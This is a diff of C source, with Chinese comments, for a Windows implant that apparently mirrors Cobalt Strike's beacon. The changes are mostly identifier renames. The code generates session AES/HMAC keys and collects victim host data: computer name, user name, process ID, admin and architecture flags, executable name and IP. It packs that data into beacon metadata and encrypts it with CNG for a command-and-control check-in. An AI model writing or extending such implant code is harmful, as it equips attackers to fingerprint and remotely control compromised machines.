@@ -12,26 +12,26 @@ extern unsigned char g_hmackey[16];
 extern int g_client_id;
 
 MakeMetaInfoResult MakeMetaInfo() {
-    MakeMetaInfoResult nullResult = { NULL, 0 };
+    MakeMetaInfoResult failed_result = { NULL, 0 };
     datap* parser = BeaconDataAlloc(sizeof(OSVERSIONINFOA) + MAX_INFO + MAX_COMPUTER_NAME + MAX_USER_NAME + MAX_FILE_NAME);
 
     // 生成随机数
     unsigned char key[16];
-    if (!RandomAESKey(key, sizeof(key))) {
+    if (!generate_random_aes_key(key, sizeof(key))) {
         fprintf(stderr, "Failed to generate AES key\n");
-        return nullResult;
+        return failed_result;
     }
 
-    unsigned char hash[32];
-    BOOL bSHA256 = SHA256_Hash(key, 16, hash);
+    unsigned char hash[32]; 
+    BOOL bSHA256 = sha256_hash(key, 16, hash);
     if (!bSHA256) {
-        fprintf(stderr, "SHA256_Hash failed\n");
-        return nullResult;
+        fprintf(stderr, "sha256_hash failed\n");
+        return failed_result;
     }
 
-    // 前16字节为 AES 密钥
+    // 前 16 字节为 AES 密钥
     memcpy(g_aeskey, hash, 16);
-    // 后16字节为 HMAC 密钥 
+    // 后 16 字节为 HMAC 密钥 
     memcpy(g_hmackey, hash + 16, 16);
 
     // 获取当前系统的 ANSI 代码页
@@ -40,13 +40,13 @@ MakeMetaInfoResult MakeMetaInfo() {
     // 获取 OEM 代码页的字节序列
     short oemcp = GetOEMCP();
 
-    // 随机生成一个 6 位偶数为BeaconId
-    g_client_id = GenerateRandomInt(100000, 999998);
+    // 随机生成一个 6 位偶数为 BeaconId
+    g_client_id = generate_random_data(100000, 999998);
 
     // PID
     uint32_t pid = GetCurrentProcessId();
 
-    // 此函数获取 Flag，根据 Flag 可以判断是否是管理员权限的beacon，是否是64位架构，beacon是否64位
+    // 此函数获取 Flag，根据 Flag 可以判断是否是管理员权限的 beacon，是否是 64 位架构，beacon 是否 64 位
     char flags = 0;
 
     if (is_x64_process(GetCurrentProcess()))
@@ -68,26 +68,26 @@ MakeMetaInfoResult MakeMetaInfo() {
 
     // info
     unsigned char* info = BeaconDataPtr(parser, MAX_INFO);
-    unsigned char* computerName = BeaconDataPtr(parser, MAX_COMPUTER_NAME);
-    unsigned char* userName = BeaconDataPtr(parser, MAX_USER_NAME);
-    unsigned char* fileName = BeaconDataPtr(parser, MAX_FILE_NAME);
+    unsigned char* computer_name = BeaconDataPtr(parser, MAX_COMPUTER_NAME);
+    unsigned char* user_name = BeaconDataPtr(parser, MAX_USER_NAME);
+    unsigned char* file_name = BeaconDataPtr(parser, MAX_FILE_NAME);
 
     int pcbBuffer = MAX_USER_NAME;
-    GetUserNameA(userName, &pcbBuffer);
+    GetUserNameA(user_name, &pcbBuffer);
 
     pcbBuffer = MAX_COMPUTER_NAME;
-    GetComputerNameA(computerName, &pcbBuffer);
+    GetComputerNameA(computer_name, &pcbBuffer);
 
     const unsigned char* file = "<unknown name>";
-    if (GetModuleFileNameA(NULL, fileName, MAX_FILE_NAME))
+    if (GetModuleFileNameA(NULL, file_name, MAX_FILE_NAME))
     {
-        unsigned char* found = strrchr(fileName, '\\');
+        unsigned char* found = strrchr(file_name, '\\');
         if (found != NULL && found != (unsigned char*)-1)
         {
             file = found + 1;
         }
     }
-    snprintf(info, MAX_INFO, "%s\t%s\t%s", computerName, userName, file);
+    snprintf(info, MAX_INFO, "%s\t%s\t%s", computer_name, user_name, file);
 
     // 开始拼接 metadata
     formatp format;
@@ -120,23 +120,23 @@ MakeMetaInfoResult MakeMetaInfo() {
     BeaconFormatInt(&format, GetProcAddress);
     // ip
     BeaconFormatInt(&format, ip);
-    // Information: Computer name, user name, executable name
+    // Information: computer name, user name, executable name
     BeaconFormatAppend(&format, info, min(strlen(info), 58));
 
-    ULONG metainfosize = ntohl(format.length - (2 * sizeof(int)));
+    ULONG metadata_size = ntohl(format.length - (2 * sizeof(int)));
 
-    memcpy(BeaconFormatOriginal(&format) + 4, &metainfosize, 4);
-    size_t packetInfoLength = BeaconFormatLength(&format);
-    unsigned char* packetInfo = (unsigned char*)malloc(packetInfoLength);
-    if (!packetInfo) {
+    memcpy(BeaconFormatOriginal(&format) + 4, &metadata_size, 4);
+    size_t packet_info_length = BeaconFormatLength(&format);
+    unsigned char* packet_info = (unsigned char*)malloc(packet_info_length);
+    if (!packet_info) {
         fprintf(stderr, "Memory allocation failed");
-        return nullResult;
+        return failed_result;
     }
-    memcpy(packetInfo, BeaconFormatOriginal(&format), packetInfoLength);
+    memcpy(packet_info, BeaconFormatOriginal(&format), packet_info_length);
 
     MakeMetaInfoResult mmir;
-    mmir.MakeMeta = packetInfo;
-    mmir.MakeMetaLen = packetInfoLength;
+    mmir.MakeMeta = packet_info;
+    mmir.MakeMetaLen = packet_info_length;
 
     BeaconDataFree(parser);
     BeaconFormatFree(&format);
@@ -195,7 +195,7 @@ Cleanup:
 }
 
 // 使用 CNG 加密元数据
-EncryptMetadataResult EncryMetadata()
+EncryptMetadataResult encryptMetadata()
 {
     EncryptMetadataResult result = { 0 };
     BCRYPT_KEY_HANDLE hKey = NULL;
@@ -255,8 +255,8 @@ EncryptMetadataResult EncryMetadata()
         goto cleanup;
     }
 
-    result.EncryptMetaData = pEncrypted;
-    result.EncryptMetaDataLen = cbEncrypted;
+    result.EncryptMetadata = pEncrypted;
+    result.EncryptMetadataLen = cbEncrypted;
     pEncrypted = NULL; 
 
 cleanup:
